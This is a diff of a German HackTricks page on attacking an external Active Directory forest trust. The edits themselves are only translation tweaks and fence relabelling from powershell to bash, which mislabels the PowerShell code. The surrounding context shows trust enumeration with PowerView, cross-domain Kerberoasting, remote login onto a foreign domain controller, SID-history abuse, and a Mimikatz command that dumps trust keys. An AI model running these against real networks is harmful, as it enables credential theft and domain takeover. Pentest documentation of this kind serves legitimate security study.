@@ -2,12 +2,12 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In diesem Szenario vertraut eine externe Domain Ihnen (oder beide vertrauen sich gegenseitig), sodass Sie eine Art Zugriff darauf erhalten können.
+In diesem Szenario vertraut eine externe Domain Ihnen (oder beide vertrauen einander), sodass Sie eine Art Zugriff darauf erhalten können.
 
 ## Aufzählung
 
 Zunächst müssen Sie das **Vertrauen** **aufzählen**:
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -56,26 +56,26 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-In der vorherigen Enumeration wurde festgestellt, dass der Benutzer **`crossuser`** in der Gruppe **`External Admins`** ist, die **Admin-Zugriff** im **DC der externen Domäne** hat.
+In der vorherigen Aufzählung wurde festgestellt, dass der Benutzer **`crossuser`** in der Gruppe **`External Admins`** ist, die **Admin-Zugriff** im **DC der externen Domäne** hat.
 
 ## Erster Zugriff
 
-Wenn Sie **keinen** **besonderen** Zugriff Ihres Benutzers in der anderen Domäne finden konnten, können Sie immer noch zur AD-Methodologie zurückkehren und versuchen, **privesc von einem unprivilegierten Benutzer** durchzuführen (Dinge wie Kerberoasting zum Beispiel):
+Wenn Sie **keinen** **besonderen** Zugriff Ihres Benutzers in der anderen Domäne finden konnten, können Sie immer noch zur AD-Methodologie zurückkehren und versuchen, **von einem nicht privilegierten Benutzer** zu **privescen** (Dinge wie Kerberoasting zum Beispiel):
 
 Sie können **Powerview-Funktionen** verwenden, um die **andere Domäne** mit dem `-Domain`-Parameter zu **enumerieren**, wie in:
-```powershell
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
 ./
 {{#endref}}
 
-## Identitätsdiebstahl
+## Identitätsübernahme
 
 ### Anmeldung
 
 Mit einer regulären Methode und den Anmeldeinformationen der Benutzer, die Zugriff auf die externe Domäne haben, sollten Sie in der Lage sein, Folgendes zuzugreifen:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID-Historie-Missbrauch
@@ -85,9 +85,9 @@ Sie könnten auch [**SID-Historie**](sid-history-injection.md) über ein Forest-
 Wenn ein Benutzer **von einem Forest zu einem anderen** migriert wird und **SID-Filterung nicht aktiviert ist**, wird es möglich, eine **SID aus dem anderen Forest** hinzuzufügen, und diese **SID** wird dem **Token des Benutzers** beim Authentifizieren **über das Vertrauen** hinzugefügt.
 
 > [!WARNING]
-> Zur Erinnerung, Sie können den Signierschlüssel mit
+> Zur Erinnerung, Sie können den Signaturschlüssel mit
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
